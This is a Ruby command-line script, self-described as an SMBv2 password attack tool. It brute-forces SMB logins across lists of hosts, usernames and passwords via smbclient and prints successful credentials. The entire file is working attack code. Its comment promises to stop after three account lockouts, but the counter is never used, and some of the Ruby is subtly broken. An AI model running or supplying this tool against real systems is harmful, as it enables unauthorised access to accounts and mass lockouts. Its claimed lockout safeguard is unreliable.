#!/usr/bin/env ruby
#smbv2 password attack tool

require 'tty'
require 'logger'
require 'colorize'
require 'trollop'

def arguments
  opts = Trollop::options do 
    version "smbv2attack 0.1b".light_blue
      opt :hosts, "Choose hosts to attack", :type => String, :short => "-H"
      opt :host, "Choose host to attack", :type => String, :short => "-h"
      opt :user, "Username", :type => String, :short => "-u"
      opt :users, "Username List", :type => String, :short => "-U"
      opt :passwords, "Password list", :type => String, :short => "-P"
      opt :password, "Password list", :type => String, :short => "-p"
      opt :domain, "Domain to attack", :type => String, :default => "WORKGROUP", :short => "-d"

      if ARGV.empty?
        puts "Need Help? Try ./smbv2attack.rb --help"
        exit
      end
  end
  opts
end

def check_smbclient
  smbclient = TTY::Which.which('smbclient')
    if smbclient.nil?
      install_smbclient
    end
  smbclient
end

def install_smbclient
  puts "SMBClient Not Installed. Downloading Now....".light_blue.bold
  `apt-get install smbclient`
end

def create_host_list(arg)
  if arg[:hosts]
    @hosts = File.readlines(arg[:hosts]).map(&:chomp &&:strip)
  else
    @hosts = [arg[:host].chomp]
  end
end

def create_pass_list(arg)
  if arg[:passwords]
    @pass = File.readlines(arg[:passwords]).map(&:chomp &&:strip)
  else
    @pass = [arg[:password]]
  end
end

def create_user_list(arg)
  if arg[:users]
    @users = File.readlines(arg[:users]).map(&:chomp &&:strip)
  else
    @users = [arg[:user].chomp]
  end
end

def command
  @log = Logger.new('debug.log')
  cmd  = TTY::Command.new(output: @log)
end

def smb2_attack(arg)
  lock_count = 0 #will iterate this each time an account is locked and kill the process when we hit 3
  puts "Attack Started #{Time.now.strftime("%H:%M:%S")}".light_blue
  @hosts.each do |host|
    @users.each do |user|
      @pass.each do |pass|
        out, err = command.run!("smbclient -W #{arg[:domain]} --max-protocol=smb3 --port=445 --timeout=0.5 //#{host}/QZQ$ -U #{user}%#{pass}")
          if out =~ /NT_STATUS_LOGON_FAILURE|NT_STATUS_ACCOUNT_DISABLED|NT_STATUS_ACCOUNT_EXPIRED/
            print "[+] #{host} Username: #{user} Password: #{pass} LOGIN FAILED - MESSAGE = #{out.split(":")[1]}"
          elsif out =~ /NT_STATUS_ACCESS_DENIED|NT_STATUS_BAD_NETWORK_NAME|NT_STATUS_PASSWORD_MUST_CHANGE/
            print "[*] #{host} Username: #{user} Password: #{pass} LOGIN SUCCESS - MESSAGE = #{out.split(":")[1]}".green.bold
          elsif out =~ /NT_STATUS_ACCOUNT_LOCKED_OUT/
            puts "[!] #{host} Username: #{user} Password: #{pass} ACCOUNT LOCKED OUT!!!!".red.bold
          else
            puts "[?] #{host} Username: #{user} Password: #{pass} UNKNOWN STATUS - MESSAGE = #{out.split(":")[1]}".cyan.bold
          end
      end
    end
  end
  puts "Attack Finished #{Time.now.strftime("%H:%M:%S")}".light_blue
end

arg = arguments
check_smbclient
create_host_list(arg)
create_user_list(arg)
create_pass_list(arg)
smb2_attack(arg)